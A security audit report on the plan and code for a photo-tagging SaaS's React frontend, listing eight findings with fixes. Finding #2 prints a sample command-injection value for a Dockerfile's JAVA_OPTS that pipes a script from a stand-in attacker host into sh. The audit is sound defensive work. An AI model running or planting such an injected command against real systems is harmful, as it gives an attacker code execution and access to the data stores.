# Security Audit: JPhotoTagger SaaS Phase 4 — React Frontend Plan

**Audited artifact:** `docs/plans/2026-02-25-saas-conversion-phase-4.md` (v7.0)
**Supporting code reviewed:**
- `worker/Dockerfile`
- `worker/src/main/resources/application.yml`
- `worker/src/main/java/org/jphototagger/worker/config/WorkerProperties.java`
- `worker/src/main/java/org/jphototagger/worker/consumer/DeleteJobConsumer.java`
- `worker/src/main/java/org/jphototagger/worker/consumer/PhotoJobConsumer.java`
- `api/src/main/java/org/jphototagger/api/scheduler/OrphanReconciliationScheduler.java`
- `api/src/main/java/org/jphototagger/api/scheduler/PhotoDeleteJobEnqueuer.java`
- `api/src/main/java/org/jphototagger/api/scheduler/UnverifiedAccountPurgeScheduler.java`

**Audit date:** 2026-03-10
**Auditor:** Lead Cyber-Security Auditor (LCSA)
**Scope assumptions:** Plan document reviewed as a specification to be implemented; implementation-code files reviewed as deployed artefacts. Findings from prior Phase 1–3 audits are considered resolved unless evidence of regression is observed.

---

## Pass 1 — Reconnaissance & Attack Surface Mapping

### Entry Points

| Layer | Entry Point | Trust Level |
|-------|-------------|-------------|
| Frontend plan | `POST /api/auth/login` | Unauthenticated |
| Frontend plan | `POST /api/register` | Unauthenticated |
| Frontend plan | `GET /api/csrf` | Unauthenticated |
| Frontend plan | `GET /api/users/me` | Authenticated (session cookie) |
| Frontend plan | `PATCH /api/users/me` | Authenticated |
| Frontend plan | `GET /api/photos` (paginated) | Authenticated |
| Frontend plan | `GET /api/photos/{id}` | Authenticated |
| Frontend plan | `GET /api/photos/trash` | Authenticated |
| Frontend plan | `POST /api/photos/{id}/restore` | Authenticated |
| Frontend plan | `GET/POST/DELETE /api/photos/{id}/keywords/{kId}` | Authenticated |
| Frontend plan | `GET /api/search?q=…&field=…&keywordId=…` | Authenticated |
| Frontend plan | `POST /api/photos` (multipart upload) | Authenticated |
| Frontend plan | `GET /api/photos/{id}/status` (poll) | Authenticated |
| Worker | Redis Streams `photo-jobs`, `delete-jobs` | Internal (trusted bus) |
| Worker | MinIO `removeObject` | Internal |
| Scheduler | MinIO `listObjects` | Internal |
| Scheduler | PostgreSQL (read/write via JPA and BYPASSRLS authJdbcTemplate) | Internal |

### Trust Boundaries

```
[Browser] ←→ [React SPA]
   │                │  session cookie + CSRF double-submit
   └────────────────▼
              [Spring Boot API]
                ├── PostgreSQL (JPA, parameterized)
                ├── Redis (XADD / stream producer)
                └── MinIO internal client (pre-signed URL generation)

[Worker]
   ├── Redis consumer (XREADGROUP / XAUTOCLAIM)
   ├── PostgreSQL (JPA read + status write)
   └── MinIO (XADD-derived object keys → removeObject)
```

### Authentication Architecture

- Session cookie (`JSESSIONID`, HttpOnly) + dual-cookie CSRF (`XSRF-TOKEN` non-HttpOnly / `X-XSRF-TOKEN` header)
- `@AuthenticationPrincipal UUID userId` — principal bound to authenticated user; no IDOR possible on `/me` endpoints
- `UserController.updateCurrentUser` accepts only `Boolean showGps` via a tightly-scoped record DTO — mass assignment prevented by design

### Sensitive Data Flows

- GPS coordinates: conditionally present in `PhotoMetadata` API response — see **Finding #1**
- Pre-signed MinIO URLs: bearer tokens valid 15 min (thumbnails) / 1 hour (originals), transmitted in photo list / photo detail responses
- EXIF / IPTC / XMP metadata: arbitrary strings from user-uploaded files, sanitised at write time (Jsoup, Phase 3); rendered via React text nodes (ESLint `react/no-danger: error` enforced)
- Credentials: email/password — over HTTPS; password never logged in any reviewed code
- `localStorage` saved searches: keyed by user UUID, contain only query terms and keyword IDs (no photo data, no GPS)

---

## Pass 2 — Systematic Vulnerability Hunting

---

### Finding #1: GPS Privacy Enforcement Is Frontend-Only — Server-Side Filtering Not Specified

**Vulnerability:** Missing server-side authorisation gate — Privacy control not enforced at the API boundary
**Severity:** Medium
**Confidence:** High
**Attack Complexity:** Low

**Location:**
- Plan: Task 4.6, lines 1421–1429 (MetadataPanel GPS suppression)
- Plan: Task 4.2 Step 2, lines 443–448 (`PhotoMetadata` TypeScript interface)

**Risk & Exploit Path:**
The plan specifies that `showGps === false` results in GPS fields being "completely absent from the DOM." The TypeScript interface comment reinforces this: "GPS fields only present when showGps === true." However, the implementation requirement documented in Task 4.6 places this gate **exclusively at the frontend render layer** — no corresponding backend filter for `GET /api/photos/{id}/metadata` is specified or referenced.

If the backend returns GPS data in the API response regardless of the user's `showGps` preference (as Phase 3 implementation appears to do — no metadata-filtering service method is specified for Phase 3), GPS coordinates are transmitted over the network to every authenticated request and are accessible via:
1. The browser's Network DevTools tab
2. In-memory React state / TanStack Query cache
3. Any browser extension with page-read access

A user who sets `showGps = false` intends to hide their location from their browser session. Relying solely on frontend rendering is a defence-in-depth violation — the privacy guarantee holds only as long as the client-side code is unmodified.

**Evidence / Trace:**

```typescript
// Plan line 1422 — ONLY a frontend rendering gate:
const showGps = useAuthStore((state) => state.user?.showGps ?? false);

// Plan line 1425 — correct DOM suppression, but:
// "completely absent from the DOM" ≠ absent from network response
```

```typescript
// Plan lines 443–448 — interface comment implies server-side filtering,
// but no API/service implementation for this is specified anywhere in Phase 4
export interface PhotoMetadata {
  exifData: Record<string, string>;
  // GPS fields only present when showGps === true  ← comment only; no enforcement specified
  gpsLatitude?: number;
  gpsLongitude?: number;
}
```

**Remediation:**
- **Primary fix:** Add a `showGps` filter to the metadata service layer. In `PhotoMetadataService.getMetadata(UUID userId, UUID photoId)`, call `userRepository.findById(userId)` and strip `gpsLatitude`, `gpsLongitude`, and all `GPS:*` keys from `exifData` before returning if `!user.isShowGps()`.
- **Architectural:** Document this as a security requirement in the Phase 4 prerequisites (Task 4.0) alongside `GET /api/users/me` — it is a backend concern that must exist before the frontend is implemented.
- **Defence-in-depth:** Retain the frontend DOM suppression as a secondary layer.

**References:** OWASP A01 (Broken Access Control) — attribute-level authorisation

---

### Finding #2: Dockerfile ENTRYPOINT Uses Shell Expansion of `JAVA_OPTS` — Command Injection Vector

**Vulnerability:** OS Command Injection via environment variable expansion — OWASP A03 / CWE-78
**Severity:** Medium
**Confidence:** Confirmed
**Attack Complexity:** Medium

**Location:**
- File: `worker/Dockerfile`, Line 18

**Risk & Exploit Path:**
The `ENTRYPOINT` uses `sh -c "java $JAVA_OPTS -jar app.jar"`. The shell expands `$JAVA_OPTS` at container start. `JAVA_OPTS` is defined as a static value in the Dockerfile `ENV` directive, but Docker allows the environment variable to be overridden at deployment time via:

- `docker run --env JAVA_OPTS="…"`
- `docker-compose.yml` `environment:` section
- Kubernetes `ConfigMap` / `Secret` injected into pod environment
- CI/CD pipeline environment variable injection

If an attacker can influence the container's environment (e.g., through a compromised CI/CD pipeline, a misconfigured deployment manifest, or a Kubernetes RBAC misconfiguration), they can inject arbitrary shell commands:

```bash
JAVA_OPTS="-version ; curl -s https://attacker.com/shell.sh | sh #"
# Expanded: sh -c "java -version ; curl ... | sh # -jar app.jar"
```

This achieves unauthenticated RCE inside the worker container, which has access to Redis, MinIO, and (via the datasource) PostgreSQL.

**Evidence / Trace:**

```dockerfile
# worker/Dockerfile line 10
ENV JAVA_OPTS="-XX:MaxRAMPercentage=75.0"   # safe default — but overridable

# worker/Dockerfile line 18 ← VULNERABLE
ENTRYPOINT ["/sbin/tini", "--", "sh", "-c", "java $JAVA_OPTS -jar app.jar"]
#                                              ^^^^^^^^^^^^^ shell-expanded
```

**Remediation:**
- **Primary fix:** Use the exec form directly with the known JVM flag, or use `CMD` overridability safely:

```dockerfile
# Option A — hardcode the known flag, expose tuning via CMD override:
ENTRYPOINT ["/sbin/tini", "--", "java", "-XX:MaxRAMPercentage=75.0", "-jar", "app.jar"]

# Option B — if runtime JVM flags are needed, use env var with exec for safe expansion:
ENTRYPOINT ["/sbin/tini", "--", "/bin/sh", "-c", "exec java ${JAVA_OPTS} -jar app.jar"]
# Note: `exec` replaces the shell — ARGV injection still possible but shell fork chain is removed.
# Restrict JAVA_OPTS to JVM flags only via deployment policy.
```

- **Architectural:** Restrict `JAVA_OPTS` injection in CI/CD by validating the pattern (e.g., only `-XX:…`, `-Xmx…`, `-D…` prefixes) if runtime override is required.
- **Defence-in-depth:** CI/CD pipeline should audit Docker build arguments and environment variables for unexpected values.

**References:** CWE-78 (OS Command Injection), Docker security best practices — exec form ENTRYPOINT

---

### Finding #3: `apiFetch` Captures Full Backend Error Response Body — Verbose Error Leakage Risk

**Vulnerability:** Information Leakage — OWASP A09 / CWE-209
**Severity:** Medium
**Confidence:** High
**Attack Complexity:** Low

**Location:**
- Plan: Task 4.2 Step 3 (`client.ts`), line 637

**Risk & Exploit Path:**
The central `apiFetch` wrapper captures the complete HTTP response body for all non-2xx responses and stores it in `ApiError.message`:

```typescript
if (!res.ok) throw new ApiError(res.status, await res.text());
```

Spring Boot's default error handling returns a JSON body that in non-production profiles can include:
- Stack traces
- Exception class names and messages
- Internal path names
- Database constraint violation details

If `ApiError.message` is ever surfaced in a toast notification, an error boundary, or `console.error`, this data is visible to the end-user and anyone with browser DevTools access. For 500 errors, this may expose internal service architecture, class hierarchy, and potentially database schema details (e.g., PostgreSQL constraint names).

Additionally, the full response body is stored in memory as a string for every failed API request, which could be a DoS vector if a malicious API endpoint returns extremely large error payloads.

**Evidence / Trace:**

```typescript
// Plan line 637 — client.ts ← RISK
if (!res.ok) throw new ApiError(res.status, await res.text());
//                                           ^^^^^^^^^^^^^^^^
// res.text() reads the full response body — no truncation, no redaction
```

```typescript
// ApiError carries the raw body:
export class ApiError extends Error {
  constructor(public status: number, message: string) {
    super(message);  // full body stored in Error.message
  }
}
```

**Remediation:**
- **Primary fix:** Truncate the error body and strip sensitive content:

```typescript
// Before:
if (!res.ok) throw new ApiError(res.status, await res.text());

// After:
if (!res.ok) {
  const body = await res.text();
  // Truncate to prevent memory pressure and limit info leakage
  const safeMessage = body.length > 200 ? body.slice(0, 200) + '…' : body;
  throw new ApiError(res.status, safeMessage);
}
```

- **Architectural:** Configure Spring Boot to return only a status code and a generic message for 5xx errors in production. Set `server.error.include-stacktrace=never` and `server.error.include-message=never` in `application.yml` (production profile). The frontend should map status codes to user-friendly messages rather than displaying backend error text.
- **Defence-in-depth:** Add structured logging on the backend for all 5xx errors (with correlation IDs), so internal details remain server-side only.

**References:** OWASP A09 (Security Logging and Monitoring Failures), CWE-209 (Information Exposure Through an Error Message)

---

### Finding #4: Cookie Security Attributes (`Secure`, `SameSite`) Not Explicitly Specified in Plan

**Vulnerability:** Security Misconfiguration — OWASP A05 / CWE-614
**Severity:** Low
**Confidence:** Medium
**Attack Complexity:** Medium (requires non-HTTPS deployment or cross-site navigation)

**Location:**
- Plan: Task 4.2 prerequisite block (MI-30), line 300

**Risk & Exploit Path:**
The plan documents the dual-cookie CSRF pattern (`JSESSIONID` HttpOnly, `XSRF-TOKEN` non-HttpOnly) but does not specify:
- `Secure` flag (HTTPS-only transmission) for either cookie
- `SameSite` attribute for either cookie

**Without `Secure`:** If the application is accidentally deployed over HTTP (e.g., internal staging, misconfigured load balancer), session cookies and CSRF tokens transmit in plaintext, enabling session hijacking via network interception.

**Without explicit `SameSite`:** Spring Security 6 defaults vary by version and configuration. If `SameSite` is not set, some browsers default to `SameSite=None` (without `Secure`) which disables cross-site isolation.

Spring Security's `CookieCsrfTokenRepository` does not automatically set `Secure=true` unless the request arrives over HTTPS; in a reverse-proxy deployment where TLS terminates at the proxy, the backend may see HTTP requests and omit `Secure`.

**Remediation:**
- **Primary fix:** Add an explicit note to Task 4.2 (and/or Task 4.0 `UserController` backend prerequisites) documenting the required cookie attributes:

```java
// Spring Security config — document and verify these attributes are set:
CookieCsrfTokenRepository repo = CookieCsrfTokenRepository.withHttpOnlyFalse();
repo.setCookieSameSite("Strict");
// Secure flag: set server.use-forward-headers=true (or ForwardedHeaderFilter)
// so Spring detects HTTPS behind a reverse proxy and sets Secure automatically.
```

- **Architectural:** Add a deployment checklist item verifying `Secure` is present on all cookies in the staging and production environments.
- **Defence-in-depth:** Configure HSTS in the API server (Spring Security `http.headers().httpStrictTransportSecurity()`) so browsers upgrade HTTP to HTTPS automatically.

**References:** OWASP A05, CWE-614 (Sensitive Cookie Without `Secure` Attribute)

---

### Finding #5: Redis Password Defaults to Empty String — Silent Unauthenticated Connection

**Vulnerability:** Security Misconfiguration — OWASP A05 / CWE-521
**Severity:** Low
**Confidence:** Confirmed
**Attack Complexity:** Low (requires only a missing environment variable)

**Location:**
- File: `worker/src/main/resources/application.yml`, Line 19

**Risk & Exploit Path:**
Spring's `${REDIS_PASSWORD:}` syntax sets the default value to an empty string when `REDIS_PASSWORD` is not set in the environment. An empty string tells Lettuce (the Redis client) to connect without authentication — it does not fail the connection attempt.

If `REDIS_PASSWORD` is accidentally omitted from a deployment configuration (e.g., missing secret in Kubernetes, incomplete `.env` file), the worker silently connects to Redis without authentication. Depending on the Redis server configuration, this may succeed even against a Redis instance that requires a password (if Redis's `requirepass` is not set).

A worker connected to an unauthenticated Redis could be used by a network-adjacent attacker to:
1. Inject malicious `photo-jobs` or `delete-jobs` stream messages
2. Exfiltrate pending job metadata
3. Clear the dead-letter stream, suppressing operator alerts

**Evidence / Trace:**

```yaml
# worker/src/main/resources/application.yml line 19 ← VULNERABLE
redis:
  password: ${REDIS_PASSWORD:}   # empty string default — no auth on missing env var
```

**Remediation:**
- **Primary fix:** Remove the default value so Spring fails fast on startup when the env var is missing:

```yaml
# After — fails at startup if REDIS_PASSWORD is not set:
redis:
  password: ${REDIS_PASSWORD}
```

- **Architectural:** Add `REDIS_PASSWORD` to the deployment checklist and verify it is set in all environment profiles (dev, staging, prod). Use a secrets manager (HashiCorp Vault, AWS Secrets Manager, Kubernetes Secrets) rather than plain env vars for credentials.
- **Defence-in-depth:** Verify this same pattern in the API service's `application.yml` — the same empty-default risk likely exists there.

---

### Finding #6: `camelizeKeys` Applied Recursively to EXIF Metadata — Underscore Keys Silently Corrupted

**Vulnerability:** Input Validation — Incorrect Output Encoding / CWE-116
**Severity:** Low
**Confidence:** Medium
**Attack Complexity:** Low (triggered by any photo whose EXIF contains underscore-containing field names)

**Location:**
- Plan: Task 4.2 Step 3, `client.ts`, lines 570–585 (`camelizeKeys` implementation)
- Plan: Task 4.6 Step 3, lines 1341–1344 (MetadataPanel EXIF rendering)

**Risk & Exploit Path:**
`camelizeKeys` transforms every `snake_case` key to `camelCase` recursively across the entire API response, including the `exif_data` JSONB object. The plan documents an exception: "EXIF keys are PascalCase (from metadata-extractor) and are not transformed by camelizeKeys." However, this assumption is incomplete:

1. Some EXIF/IPTC/XMP fields output by ExifTool use underscores (e.g., `GPS_Altitude` in some ExifTool output modes, `IPTC:By-line_Title`, or vendor-specific XMP fields).
2. `metadata-extractor` (the Java library) may output fields like `Exif IFD0 - Make` (with spaces — not affected) but also structured group keys that vary by format.

When `camelizeKeys` transforms a key like `GPS_Altitude` → `gPSAltitude`, the `MetadataPanel` component receives a key it does not expect. The field silently disappears from the display, without any error. There is no data loss at the API layer, but the UI fails to render the field.

**Security implication:** If a future feature gates access on a specific EXIF key name (e.g., checking `photo.exifData['GPS_Source']` to verify GPS data provenance), a naming mismatch from the transform could bypass the gate.

**Evidence / Trace:**

```typescript
// Plan lines 570–585 — camelizeKeys applied to full API response including exif_data
function toCamelCase(key: string): string {
  return key.replace(/_([a-z])/g, (_, letter) => letter.toUpperCase());
}

export function camelizeKeys(obj: unknown): unknown {
  if (obj !== null && typeof obj === 'object') {
    return Object.fromEntries(
      Object.entries(obj as Record<string, unknown>).map(([k, v]) => [
        toCamelCase(k),   // ← transforms ALL keys, including EXIF dictionary keys
        camelizeKeys(v),
      ])
    );
  }
  return obj;
}
```

**Remediation:**
- **Primary fix:** Exempt the `exifData` field from the `camelizeKeys` transform by applying key transformation at the top level only, or by explicitly preserving nested EXIF objects:

```typescript
export function camelizeKeys(obj: unknown, depth = 0): unknown {
  if (Array.isArray(obj)) return obj.map(item => camelizeKeys(item, depth));
  if (obj !== null && typeof obj === 'object') {
    return Object.fromEntries(
      Object.entries(obj as Record<string, unknown>).map(([k, v]) => {
        const newKey = toCamelCase(k);
        // Don't recurse into EXIF data dictionaries — keys are opaque metadata strings
        const newVal = newKey === 'exifData' ? v : camelizeKeys(v, depth + 1);
        return [newKey, newVal];
      })
    );
  }
  return obj;
}
```

- **Architectural:** Document the EXIF key pass-through assumption in `client.ts` with an explicit code comment, and add a test that verifies an underscore-containing EXIF key (e.g., `GPS_Altitude`) passes through `camelizeKeys` without transformation when nested under `exif_data`.

---

### Finding #7: No Content Security Policy Specified for Frontend

**Vulnerability:** Security Misconfiguration — OWASP A05
**Severity:** Low
**Confidence:** Medium
**Attack Complexity:** High (requires XSS bypass of `react/no-danger` ESLint rule and React's text-node rendering)

**Location:**
- Plan: Task 4.1 Step 2 (Vite configuration), Task 4.9 Step 3 (phase completion gate)

**Risk & Exploit Path:**
The plan correctly enforces `react/no-danger: error` as an ESLint rule and mandates that all EXIF values render via React text nodes. However, there is no specification of a Content Security Policy (CSP) header for the production build.

Without a CSP, if a future developer bypasses the ESLint rule (e.g., in a component not covered by the rule, a dynamically-imported module, or a third-party shadcn component), any injected `<script>` tag or `javascript:` URI will execute without browser-level enforcement. Additionally, third-party scripts could be injected via compromised CDN resources if any are added in the future.

A strict CSP (`script-src 'self'`, `object-src 'none'`) would provide a hard browser-enforced boundary independent of application-layer controls.

**Remediation:**
- **Primary fix:** Add CSP to the Task 4.9 phase completion gate checklist and document a recommended header for the nginx/reverse-proxy configuration:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';   # required for Tailwind CSS
  img-src 'self' data: blob: https://<minio-domain>;
  connect-src 'self' https://<api-domain>;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';
```

- **Architectural:** Add `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, and `Referrer-Policy: strict-origin-when-cross-origin` as required headers in the deployment spec.
- **Defence-in-depth:** Add CSP violation reporting (`report-uri` / `report-to`) to detect any bypass attempts in production.

---

### Finding #8: `null lastModified()` Skips Recency Guard in Orphan Reconciler — Potential False-Positive Deletion

**Vulnerability:** Business Logic Flaw — CWE-476 (Null Pointer Dereference in logic gate)
**Severity:** Low
**Confidence:** Low (MinIO reliably returns `lastModified` for non-directory objects; this is a theoretical edge case)
**Attack Complexity:** High (requires MinIO listing anomaly coinciding with in-progress upload)

**Location:**
- File: `api/src/main/java/org/jphototagger/api/scheduler/OrphanReconciliationScheduler.java`, Lines 120–122

**Risk & Exploit Path:**
The recency guard that protects in-progress uploads from false-positive orphan detection is:

```java
if (item.lastModified() != null && item.lastModified().isAfter(recencyCutoff)) {
    continue;
}
```

When `lastModified()` returns `null` (theoretically possible if MinIO returns an incomplete listing entry for a freshly-written object under certain conditions), the null check short-circuits the guard as false. The object proceeds to the orphan detection check. If the upload is between Transaction 1 (MinIO PUT completed) and Transaction 2 (DB `storage_key` updated), the `photos` row for this `photo_id` will not yet have the `storage_key` set. However, the `photos` row DOES exist after Tx 1. The `findAllById` check correctly finds the row, so the delete job is NOT enqueued for an active photo. The real risk is only for the edge case where the `photos` row also doesn't exist (upload crashed between Tx 0 and Tx 1) — in which case deletion is the correct outcome anyway.

This finding is primarily a code clarity/correctness concern rather than an active vulnerability, but the logic is subtly incorrect: the intent is "skip if too recent," and silently treating `null` as "old enough" is an unexpected default.

**Evidence / Trace:**

```java
// OrphanReconciliationScheduler.java lines 120–122
if (item.lastModified() != null && item.lastModified().isAfter(recencyCutoff)) {
    continue;  // skip recent objects
}
// ← null lastModified() falls through to orphan check with no recency protection
```

**Remediation:**
- **Primary fix:** Treat `null` as "recent enough to skip" — this is the safer conservative choice:

```java
// Before (falls through on null):
if (item.lastModified() != null && item.lastModified().isAfter(recencyCutoff)) {

// After (skip if null — conservative):
if (item.lastModified() == null || item.lastModified().isAfter(recencyCutoff)) {
```

- **Defence-in-depth:** Add a `WARN` log entry when `lastModified()` is null so the condition is observable in production.

---

## 1. Executive Summary

The JPhotoTagger Phase 4 plan describes a well-structured React frontend with a notably mature security posture. The team has demonstrably learned from prior phase audits — version sentinels (`REPLACE_ME`) prevent unpinned supply chain installations; the dual-cookie CSRF pattern is correctly implemented with explicit ordering (`bootstrapCsrf()` before first mutation); `@AuthenticationPrincipal UUID userId` binding prevents IDOR on all `/me` endpoints; the `UpdateUserRequest` record DTO prevents mass-assignment of sensitive user fields; and the `STORAGE_KEY_PATTERN` regex in `DeleteJobConsumer` provides a robust allowlist defence against path traversal via a compromised Redis stream.

The most significant finding is architectural: **GPS privacy enforcement is documented only at the frontend render layer, with no server-side filtering requirement specified** (Finding #1). The `PhotoMetadata` TypeScript interface comment implies server-side filtering ("GPS fields only present when showGps === true"), but no corresponding implementation requirement exists in the plan or in Phase 3. As written, GPS coordinates travel over the wire to every authenticated browser session regardless of the user's preference — the privacy guarantee is entirely client-side and can be bypassed with DevTools. This should be an explicit backend requirement before frontend implementation begins.

A confirmed command injection vector exists in the worker `Dockerfile` (Finding #2): the ENTRYPOINT uses `sh -c "java $JAVA_OPTS ..."`, which shell-expands `JAVA_OPTS`. An attacker who can influence the container's environment (compromised CI/CD pipeline, Kubernetes RBAC misconfiguration, `.env` file tampering) can achieve RCE in the worker container, which has access to Redis, MinIO, and PostgreSQL. This is the highest-urgency fix: it is in deployed code, exploitable via a realistic CI/CD attack path, and requires a one-line Dockerfile change. Three lower-severity findings round out the report: verbose error body capture in `apiFetch`, a Redis empty-password default, and absent CSP documentation.

The codebase is **not recommended for production deployment until Findings #1 and #2 are remediated.** Finding #2 is in deployed infrastructure code today. Finding #1 must be resolved in the plan before any frontend implementation begins.

---

## 2. Findings Summary Table

| # | Title | Category | Severity | Confidence | Similar Instances | Status |
|---|-------|----------|----------|------------|-------------------|--------|
| 1 | GPS Privacy: Frontend-Only Enforcement | A01 – Broken Access Control | Medium | High | 0 | BLOCK |
| 2 | Dockerfile JAVA_OPTS Shell Expansion | A03 – Injection (Command) | Medium | Confirmed | 0 | BLOCK |
| 3 | `apiFetch` Verbose Error Body Capture | A09 – Logging / Leakage | Medium | High | 0 | FIX |
| 4 | Cookie `Secure`/`SameSite` Not Specified | A05 – Misconfiguration | Low | Medium | 0 | FIX |
| 5 | Redis Password Empty-String Default | A05 – Misconfiguration | Low | Confirmed | 1 (API yml) | FIX |
| 6 | `camelizeKeys` Corrupts EXIF Keys | Input Validation | Low | Medium | 0 | FIX |
| 7 | No CSP Documented for Frontend | A05 – Misconfiguration | Low | Medium | 0 | PLAN |
| 8 | Null `lastModified()` Skips Recency Guard | Business Logic | Low | Low | 0 | FIX |

---

## 3. Security Quality Score (SQS)

**Score calculation:**

| Finding | Severity | Deduction |
|---------|----------|-----------|
| F1 — GPS frontend-only enforcement | Medium | −8 |
| F2 — Dockerfile JAVA_OPTS injection | Medium | −8 |
| F3 — apiFetch verbose error body | Medium | −8 |
| F4 — Cookie Secure/SameSite undocumented | Low | −2 |
| F5 — Redis empty password default | Low | −2 |
| F6 — camelizeKeys EXIF corruption | Low | −2 |
| F7 — No CSP specified | Low | −2 |
| F8 — Null lastModified recency guard | Low | −2 |

**Final SQS: 66/100**
**Hard gates triggered:** No (no Critical findings; no hardcoded secrets)
**Posture:** Acceptable — **deploy only with remediation commitment and timeline**

Findings #1 and #2 must be resolved before frontend implementation begins (F1) and before the next production deployment (F2). Findings #3–#8 should be tracked in the implementation sprint.

---

## 4. Positive Security Observations

1. **Storage key allowlist in `DeleteJobConsumer` (SA3-F2):** The `STORAGE_KEY_PATTERN` regex strictly validates MinIO object keys from Redis stream messages before any `removeObject` call. This prevents path traversal and arbitrary-file-deletion attacks even if the Redis stream is compromised — an adversary cannot inject `../../secrets` as a deletion target.

2. **Distributed startup recovery lock with ownership-verified Lua refresh:** The `REFRESH_LOCK_SCRIPT` Lua atomically verifies ownership before extending the TTL, preventing a GC-paused worker from silently losing ownership and allowing two instances to concurrently re-enqueue photos. The lock release script is similarly atomic. This is a textbook-correct Redis distributed lock implementation.

3. **`@AuthenticationPrincipal UUID userId` + narrow DTO:** The `UserController` (Task 4.0) binds all operations to the authenticated principal and accepts only `Boolean showGps` in `UpdateUserRequest`. The combination eliminates IDOR and mass-assignment in a single design decision.

4. **Version pinning throughout the plan:** The `REPLACE_ME` sentinel pattern for all npm dependencies (with linked release pages), combined with the digest-pinned Docker base image (`eclipse-temurin:21-jre-alpine@sha256:...`) and pinned Alpine package versions, reflects a mature supply chain security posture across both the frontend plan and the container layer.

5. **CSRF bootstrap sequencing:** `bootstrapCsrf()` is called at application startup via `async init()` before `ReactDOM.createRoot()`, with a `return` on failure that prevents the React app from rendering. This eliminates the window between page load and CSRF cookie availability that would cause silent 403 failures on first mutations. The `isHydrating: true` default in the Zustand store, combined with `ProtectedRoute`'s spinner, prevents premature redirects during session hydration. Both are correct and non-obvious patterns that are correctly documented and tested.

---

## 5. Prioritized Remediation Roadmap

### 1. F2 — Dockerfile ENTRYPOINT Shell Expansion (Finding #2)
**Priority:** Immediate — deployed infrastructure code, exploitable via CI/CD compromise
**Why:** The worker container has access to Redis, MinIO, and PostgreSQL. Command injection via `JAVA_OPTS` is a realistic CI/CD attack path with high blast radius.
**Effort:** Quick Win — single-line Dockerfile change
**Owner:** DevOps
```dockerfile
# Replace line 18:
ENTRYPOINT ["/sbin/tini", "--", "java", "-XX:MaxRAMPercentage=75.0", "-jar", "app.jar"]
```

### 2. F1 — GPS Privacy: Backend Filtering Requirement (Finding #1)
**Priority:** Before frontend implementation begins (Task 4.6)
**Why:** Without a server-side gate, the privacy guarantee for GPS data is illusory — it survives a browser DevTools inspection. This must be specified as a backend requirement and implemented before the frontend metadata panel is built.
**Effort:** Moderate — add GPS filtering to the Phase 3 metadata service and document in Task 4.0 prerequisites
**Owner:** Backend

### 3. F3 — `apiFetch` Verbose Error Body (Finding #3)
**Priority:** High — included in Task 4.2 implementation
**Why:** In production, Spring Boot error responses can include stack traces. Storing and potentially displaying these to users is an information disclosure risk.
**Effort:** Quick Win — truncate to 200 chars in `apiFetch` + configure `server.error.include-stacktrace=never` in API `application.yml`
**Owner:** Backend + Frontend

### 4. F5 — Redis Empty Password Default (Finding #5)
**Priority:** Before next deployment
**Why:** A missing `REDIS_PASSWORD` env var silently connects to Redis without authentication. The same pattern likely exists in the API service's `application.yml`.
**Effort:** Quick Win — remove `:` (default) from `${REDIS_PASSWORD:}` in both `worker` and `api` application.yml files
**Owner:** DevOps / Backend

### 5. F6 — `camelizeKeys` EXIF Key Corruption (Finding #6)
**Priority:** During Task 4.2 / 4.6 implementation
**Why:** Silently drops metadata fields that contain underscores. While low probability today, it is a latent bug that becomes harder to diagnose after deployment.
**Effort:** Quick Win — exempt `exifData` dictionary from recursive camelization
**Owner:** Frontend
